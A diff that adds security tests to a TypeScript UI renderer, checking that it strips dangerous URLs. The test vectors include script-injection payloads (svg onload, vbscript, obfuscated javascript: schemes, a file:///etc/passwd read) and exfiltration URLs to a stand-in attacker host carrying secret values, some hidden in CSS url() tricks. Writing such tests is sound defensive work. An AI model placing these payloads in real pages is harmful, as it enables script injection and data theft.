@@ -4,8 +4,11 @@ import { DefaultUIRenderer } from "../packages/core/src/ui";
 import {
   createElementNode,
   createTextNode,
+  DEFAULT_RUNTIME_PLAN_SPEC_VERSION,
   type RuntimeExecutionResult,
+  type RuntimePlan,
 } from "../packages/ir/src/index";
+import { DefaultRuntimeManager } from "../packages/runtime/src/index";
 
 test("ui renderer can stringify preact render artifacts", async () => {
   const preact = (await import("preact")) as {
@@ -142,6 +145,144 @@ test("ui renderer drops unsafe javascript urls and adds rel for _blank", () => {
   assert.doesNotMatch(html, /href=/);
   assert.match(html, /target="_blank"/);
   assert.match(html, /rel="noopener noreferrer"/);
+});
+
+test("ui renderer drops dangerous and obfuscated URL protocols", () => {
+  const renderer = new DefaultUIRenderer();
+  const vectors = [
+    "data:image/svg+xml,<svg onload=alert(1)>",
+    "vbscript:msgbox(1)",
+    "java\nscript:alert(1)",
+    "file:///etc/passwd",
+    "blob:https://evil.example.com/id",
+    "mailto:leak@example.com",
+    "tel:+12025550123",
+    "/\\evil.example.com/secret",
+  ];
+
+  for (const value of vectors) {
+    const html = renderer.renderNode(createElementNode("img", { src: value }));
+    assert.doesNotMatch(html, /\ssrc=/, `expected URL to be dropped: ${value}`);
+  }
+});
+
+test("ui renderer drops remote URLs from request-capable attributes", () => {
+  const renderer = new DefaultUIRenderer();
+  const remoteValues = [
+    "https://evil.example.com/collect?secret=context-value",
+    "http://evil.example.com/collect",
+    "//evil.example.com/collect",
+  ];
+
+  for (const value of remoteValues) {
+    const html = renderer.renderNode(
+      createElementNode("a", { href: value }, [createTextNode("external")]),
+    );
+    assert.doesNotMatch(
+      html,
+      /\shref=/,
+      `expected remote URL to be dropped: ${value}`,
+    );
+    assert.doesNotMatch(html, /context-value/);
+  }
+
+  const requestAttributesHtml = renderer.renderNode(
+    createElementNode("img", {
+      srcSet: "/safe.png 1x, https://evil.example.com/collect 2x",
+      ping: "/audit https://evil.example.com/collect",
+      background: "https://evil.example.com/background.png",
+    }),
+  );
+  assert.doesNotMatch(requestAttributesHtml, /\ssrcSet=/);
+  assert.doesNotMatch(requestAttributesHtml, /\sping=/);
+  assert.doesNotMatch(requestAttributesHtml, /\sbackground=/);
+
+  const legacyAndSvgHtml = renderer.renderNode(
+    createElementNode("svg", {
+      fill: "u/**/rl(https://evil.example.com/fill.svg#paint)",
+      filter: "u\\72l(data:image/svg+xml,<svg onload=alert(1)>)",
+      stroke: "u\\\nrl(https://evil.example.com/stroke.svg#paint)",
+      lowsrc: "https://evil.example.com/preview.png",
+      dynsrc: "//evil.example.com/video.mov",
+    }),
+  );
+  assert.doesNotMatch(legacyAndSvgHtml, /\sfill=/);
+  assert.doesNotMatch(legacyAndSvgHtml, /\sfilter=/);
+  assert.doesNotMatch(legacyAndSvgHtml, /\sstroke=/);
+  assert.doesNotMatch(legacyAndSvgHtml, /\slowsrc=/);
+  assert.doesNotMatch(legacyAndSvgHtml, /\sdynsrc=/);
+});
+
+test("ui renderer drops remote URLs after context and state interpolation", async () => {
+  const runtime = new DefaultRuntimeManager();
+  await runtime.initialize();
+  const plan: RuntimePlan = {
+    specVersion: DEFAULT_RUNTIME_PLAN_SPEC_VERSION,
+    id: "ui_url_interpolation",
+    version: 1,
+    root: createElementNode("img", {
+      src: "https://evil.example.com/{{vars.contextSecret}}/{{state.stateSecret}}",
+    }),
+    state: {
+      initial: {
+        stateSecret: "state-token",
+      },
+    },
+  };
+
+  try {
+    const result = await runtime.executePlan(plan, {
+      variables: {
+        contextSecret: "context-token",
+      },
+    });
+    assert.equal(result.root.type, "element");
+    assert.equal(
+      result.root.type === "element" ? result.root.props?.src : undefined,
+      "https://evil.example.com/context-token/state-token",
+    );
+
+    const html = await new DefaultUIRenderer().render(result);
+    assert.doesNotMatch(html, /\ssrc=/);
+    assert.doesNotMatch(html, /context-token|state-token/);
+  } finally {
+    await runtime.terminate();
+  }
+});
+
+test("ui renderer preserves relative and safe non-network URLs", () => {
+  const renderer = new DefaultUIRenderer();
+  const imageHtml = renderer.renderNode(
+    createElementNode("img", {
+      src: "/assets/image.png",
+      srcSet: "./image.png 1x, ../image@2x.png 2x",
+    }),
+  );
+  const mailHtml = renderer.renderNode(
+    createElementNode("a", { href: "mailto:support@example.com" }, [
+      createTextNode("Email"),
+    ]),
+  );
+  const telephoneHtml = renderer.renderNode(
+    createElementNode("a", { href: "tel:+12025550123" }, [
+      createTextNode("Call"),
+    ]),
+  );
+  const svgHtml = renderer.renderNode(
+    createElementNode("path", {
+      fill: "url(#gradient)",
+      filter: "url(../filters.svg#blur)",
+      cursor: "url(/cursors/pointer.cur), pointer",
+    }),
+  );
+
+  assert.match(imageHtml, /src="\/assets\/image\.png"/);
+  assert.match(imageHtml, /srcSet="\.\/image\.png 1x, \.\.\/image@2x\.png 2x"/);
+  assert.match(mailHtml, /href="mailto:support@example\.com"/);
+  assert.match(telephoneHtml, /href="tel:\+12025550123"/);
+  assert.match(svgHtml, /fill="url\(#gradient\)"/);
+  assert.match(svgHtml, /filter="url\(\.\.\/filters\.svg#blur\)"/);
+  assert.match(svgHtml, /cursor="url\(\/cursors\/pointer\.cur\), pointer"/);
 });
 
 test("ui renderer drops unsafe inline style values", () => {
